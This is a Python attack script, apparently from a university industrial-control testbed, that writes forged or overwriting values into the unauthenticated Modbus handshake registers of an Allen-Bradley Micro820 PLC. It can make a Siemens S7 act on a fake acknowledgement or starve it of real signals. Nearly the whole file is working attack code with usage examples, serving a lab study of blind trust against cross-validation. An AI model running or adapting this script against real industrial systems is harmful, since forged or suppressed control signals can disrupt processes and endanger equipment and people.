#!/usr/bin/env python3
"""
modbus_inject.py

MATRIX Testbed — direct Modbus-write handshake attack (NO MITM required).

WHY THIS EXISTS
    The inter-PLC handshake registers live in the Allen-Bradley Micro820 (AB),
    which is an UNAUTHENTICATED Modbus TCP server on the control LAN:
        reg 0 (400001) : S7<->AB   (ready=1 from S7, ack=2 from AB)   [BLIND trust]
        reg 1 (400002) : AB<->TM221 (ready=1 from AB, ack=2 from TM221)
                         -- TM221 cross-checks a light barrier on "ready" (DEFENDED)
    Because the attacker model is a compromised control-LAN endpoint, we can
    simply CONNECT to AB and WRITE those registers — no ARP-spoof, no NFQUEUE.
    This is the canonical "unauthenticated Modbus write from a compromised host"
    attack, and it cleanly demonstrates the trust-vs-cross-validation finding:
        forge reg0=2  -> S7 accepts fake ack (blind)    -> BITES
        forge reg1=1  -> TM221 refuses (light barrier)  -> DEFEATED

    It works WITH the latching handshake: when S7 has written reg0=1 and is
    polling for the ack, it is NOT writing reg0 — so our write of 2 lands and S7
    reads it. (For suppression we clobber the register faster than the peer polls.)

ACTIONS
    forge    : wait for the --trigger-value to appear in the register (event mode),
               then WRITE --value (the fabricated signal). In time mode (
               --window-trigger), write --value immediately and re-assert it for
               the window so the peer is guaranteed to read it.
    suppress : continuously OVERWRITE the register with --value (default 0,
               "no signal") at --rate Hz for the window, so the real signal set by
               a PLC is clobbered before the polling peer can read it. (Racy by
               nature — clean suppression is better done with the MITM drop; this
               is the no-MITM fallback.)

GROUND-TRUTH LOG
    results/<run_id>/attack_log.json  — share --run-id with the experiment logger
    so pcap (SPAN) + state log + this attack-log align by run_id + time. NTP-sync
    Kali and the SCADA PC.

INSTALL (Kali):  pip install pymodbus --break-system-packages
USAGE (examples)
    # Forge the ack to S7 (T2 forge, BLIND -> should bite): when S7 sets ready=1,
    # write ack=2 so S7 proceeds on a fabricated acknowledgement.
    sudo python3 modbus_inject.py --register 0 --action forge --value 2 \
         --trigger-value 1 --run-id t2_forge_ack_0001

    # Forge "ready" to TM221 (T3 forge, DEFENDED -> should be refused):
    sudo python3 modbus_inject.py --register 1 --action forge --value 1 \
         --window-trigger 10 --run-id t3_forge_ready_defended_0001

    # Suppress the ack to S7 (T2 suppress via clobber): hold reg0 at 0 for 30 s.
    sudo python3 modbus_inject.py --register 0 --action suppress --value 0 \
         --hold 30 --rate 50 --run-id t2_suppress_ack_clobber_0001

Author : MATRIX / Intelligent Connectivity Group — UCT
"""

import argparse
import json
import os
import sys
import time
from datetime import datetime, timezone

from pymodbus.client import ModbusTcpClient     # pip install pymodbus

# ==========================================================================
# CONFIGURATION
# ==========================================================================
AB_IP        = "192.168.50.20"   # Micro820 — the Modbus SERVER holding the regs
MODBUS_PORT  = 502
DEFAULT_UNIT = 1                 # Modbus unit/slave id of AB's server.
                                # CONFIRM from the pcap (the unit-id byte in the
                                # PLCs' requests to AB); override with --unit.
RESULTS_DEFAULT = "results"

# Human labels for the two registers, for logging.
REG_NAME = {0: "SiemensHandshakeCode(reg0)", 1: "SchneiderHandshakeCode(reg1)"}


def now_iso():
    return datetime.now(timezone.utc).isoformat()


# ==========================================================================
# MODBUS HELPERS — version-proof across pymodbus 2.x / 3.x / 4.x.
# The unit/slave-id keyword was renamed across versions:
#   2.x: unit=   | 3.x: slave=   | 4.x: device_id=
# We detect which keyword the installed pymodbus accepts, ONCE, and reuse it.
# ==========================================================================
_UNIT_KW = None   # resolved on first use: one of "device_id", "slave", "unit"

def _resolve_unit_kw(client, unit):
    """Find which unit-id keyword this pymodbus accepts (and confirm it works)."""
    global _UNIT_KW
    import inspect
    # Prefer introspection of the method signature, newest name first.
    try:
        params = inspect.signature(client.read_holding_registers).parameters
        for kw in ("device_id", "slave", "unit"):
            if kw in params:
                _UNIT_KW = kw
                return
    except (TypeError, ValueError):
        pass
    # Fallback: probe by trying each keyword with a harmless read.
    for kw in ("device_id", "slave", "unit"):
        try:
            client.read_holding_registers(address=0, count=1, **{kw: unit})
            _UNIT_KW = kw
            return
        except TypeError:
            continue            # wrong keyword name for this version
        except Exception:
            _UNIT_KW = kw        # keyword accepted; the read itself may have errored
            return
    raise RuntimeError("could not determine pymodbus unit-id keyword")

def read_reg(client, address, unit):
    if _UNIT_KW is None:
        _resolve_unit_kw(client, unit)
    rr = client.read_holding_registers(address=address, count=1, **{_UNIT_KW: unit})
    if rr.isError():
        raise RuntimeError(f"read reg{address} failed: {rr}")
    return rr.registers[0]

def write_reg(client, address, value, unit):
    if _UNIT_KW is None:
        _resolve_unit_kw(client, unit)
    wr = client.write_register(address=address, value=value, **{_UNIT_KW: unit})
    if wr.isError():
        raise RuntimeError(f"write reg{address}={value} failed: {wr}")
    return True


# ==========================================================================
# ATTACK ACTIONS
# ==========================================================================
def run_forge(client, args, log):
    """
    event mode (default): poll the register until it equals --trigger-value
    (e.g. S7 has set ready=1 and is now waiting for the ack), then write --value
    (the forged signal) and re-assert it for --hold seconds so the peer reads it.
    time mode (--window-trigger SEC): write --value immediately and re-assert for
    SEC seconds (used when there is no natural trigger to wait for, e.g. forging a
    "ready" when the line is idle).
    """
    unit, reg, val = args.unit, args.register, args.value
    t_arm = time.monotonic()

    # 1) Decide when the window opens.
    if args.window_trigger is not None:                 # TIME mode
        hold = args.window_trigger
        print(f"[{now_iso()}] time-mode forge: writing reg{reg}={val} now, holding {hold}s")
    else:                                               # EVENT mode
        hold = args.hold
        print(f"[{now_iso()}] event-mode forge: waiting for reg{reg}=={args.trigger_value} "
              f"(max {args.max_wait}s) ...")
        while True:
            cur = read_reg(client, reg, unit)
            if cur == args.trigger_value:
                log["window_open_wall"] = now_iso()
                log["trigger_observed"] = True
                print(f"[{now_iso()}] TRIGGER seen (reg{reg}={cur}) -> forging {val}")
                break
            if time.monotonic() - t_arm > args.max_wait:
                print(f"[{now_iso()}] trigger not seen within {args.max_wait}s — aborting")
                log["aborted"] = "trigger_timeout"
                return
            time.sleep(0.01)                            # tight poll to catch the latch window

    # 2) Window open: write the forged value and re-assert it through the window,
    #    so a continuously-polling peer is guaranteed to read it even if a PLC
    #    also writes the register.
    if log.get("window_open_wall") is None:
        log["window_open_wall"] = now_iso()
    t_end = time.monotonic() + hold
    n = 0
    while time.monotonic() < t_end:
        write_reg(client, reg, val, unit)
        n += 1
        log["writes"] = n
        time.sleep(1.0 / max(args.rate, 1))
    log["window_close_wall"] = now_iso()
    print(f"[{now_iso()}] forge done: {n} writes of reg{reg}={val}")


def run_suppress(client, args, log):
    """
    Clobber the register with --value (default 0 = 'no signal') at --rate Hz for
    --hold seconds, so the real signal a PLC writes is overwritten before the
    polling peer reads it. event mode waits for the signal to appear first; time
    mode starts immediately.
    """
    unit, reg, val = args.unit, args.register, args.value
    t_arm = time.monotonic()

    if args.window_trigger is not None:                 # TIME mode
        hold = args.window_trigger
    else:                                               # EVENT mode: wait for signal
        hold = args.hold
        print(f"[{now_iso()}] event-mode suppress: waiting for reg{reg}=={args.trigger_value} ...")
        while True:
            if read_reg(client, reg, unit) == args.trigger_value:
                log["trigger_observed"] = True
                print(f"[{now_iso()}] signal appeared -> clobbering to {val}")
                break
            if time.monotonic() - t_arm > args.max_wait:
                print(f"[{now_iso()}] signal not seen within {args.max_wait}s — aborting")
                log["aborted"] = "trigger_timeout"
                return
            time.sleep(0.005)

    log["window_open_wall"] = now_iso()
    t_end = time.monotonic() + hold
    n = 0
    while time.monotonic() < t_end:
        write_reg(client, reg, val, unit)               # overwrite the signal
        n += 1
        log["writes"] = n
        time.sleep(1.0 / max(args.rate, 1))
    log["window_close_wall"] = now_iso()
    print(f"[{now_iso()}] suppress(clobber) done: {n} overwrites of reg{reg}={val}")


# ==========================================================================
# MAIN
# ==========================================================================
def build_parser():
    p = argparse.ArgumentParser(description="MATRIX direct Modbus-write handshake attack (no MITM).")
    p.add_argument("--register", type=int, required=True, choices=[0, 1],
                   help="0 = SiemensHandshakeCode (S7<->AB), 1 = SchneiderHandshakeCode (AB<->TM221)")
    p.add_argument("--action", required=True, choices=["forge", "suppress"],
                   help="forge = write a fabricated signal; suppress = clobber the register")
    p.add_argument("--value", type=int, required=True,
                   help="value to write (forge: the fake signal, e.g. 2; suppress: 0)")
    p.add_argument("--trigger-value", type=int, default=1,
                   help="event mode: wait until the register equals this before acting (default 1)")
    p.add_argument("--window-trigger", type=float, default=None, metavar="SEC",
                   help="TIME mode: act immediately for SEC seconds. Omit for EVENT mode.")
    p.add_argument("--hold", type=float, default=30.0, help="event-mode window seconds (default 30)")
    p.add_argument("--rate", type=float, default=50.0, help="writes per second within the window")
    p.add_argument("--max-wait", type=float, default=120.0, help="event mode: give up after this long")
    p.add_argument("--unit", type=int, default=DEFAULT_UNIT, help="AB Modbus unit/slave id")
    p.add_argument("--ab-ip", default=AB_IP, help="AB Modbus server IP")
    p.add_argument("--run-id", required=True, help="shared with the experiment logger")
    p.add_argument("--results", default=RESULTS_DEFAULT, help="output directory")
    p.add_argument("--dry-run", action="store_true", help="print the plan and exit")
    return p


def main():
    args = build_parser().parse_args()

    predicted = _predict(args)
    print("=" * 72)
    print(" MATRIX direct Modbus-write attack")
    print(f"   target     : {args.ab_ip}:{MODBUS_PORT} unit {args.unit}, "
          f"{REG_NAME.get(args.register)}")
    print(f"   action      : {args.action}  value={args.value}")
    print(f"   trigger     : {'time-based' if args.window_trigger is not None else 'event (reg==%d)'%args.trigger_value}")
    print(f"   rate/hold   : {args.rate} Hz / "
          f"{args.window_trigger if args.window_trigger is not None else args.hold} s")
    print(f"   PREDICTED   : {predicted}")
    print(f"   run-id      : {args.run_id}")
    print("=" * 72)
    if args.dry_run:
        print("dry-run — no connection, no writes."); return 0

    log = {
        "run_id": args.run_id,
        "config": vars(args) | {"ab_ip": args.ab_ip, "port": MODBUS_PORT,
                                "register_name": REG_NAME.get(args.register)},
        "armed_wall": now_iso(),
        "window_open_wall": None, "window_close_wall": None,
        "trigger_observed": False, "writes": 0, "aborted": None,
    }

    client = ModbusTcpClient(args.ab_ip, port=MODBUS_PORT)
    if not client.connect():
        print(f"ERROR: could not connect to AB at {args.ab_ip}:{MODBUS_PORT}")
        return 2
    try:
        if args.action == "forge":
            run_forge(client, args, log)
        else:
            run_suppress(client, args, log)
    except KeyboardInterrupt:
        log["aborted"] = "keyboard_interrupt"
    except Exception as exc:
        log["aborted"] = repr(exc)
        print(f"ERROR during attack: {exc}")
    finally:
        client.close()
        out_dir = os.path.join(args.results, args.run_id)
        os.makedirs(out_dir, exist_ok=True)
        path = os.path.join(out_dir, "attack_log.json")
        with open(path, "w") as f:
            json.dump(log, f, indent=2, default=str)
        print(f"attack-log written: {path}")
        print(f"writes sent: {log['writes']}")
    return 0


def _predict(args):
    if args.action == "forge" and args.register == 1:
        return "fabricated reg1 'ready' SHOULD BE DEFEATED by TM221's light-barrier cross-check"
    if args.action == "forge" and args.register == 0:
        return "fabricated reg0 signal accepted (blind trust) -> S7/AB acts on false state"
    if args.action == "suppress":
        return "clobber overwrites the real signal before the peer polls it -> starvation/freeze (racy)"
    return "see matrix"


if __name__ == "__main__":
    sys.exit(main())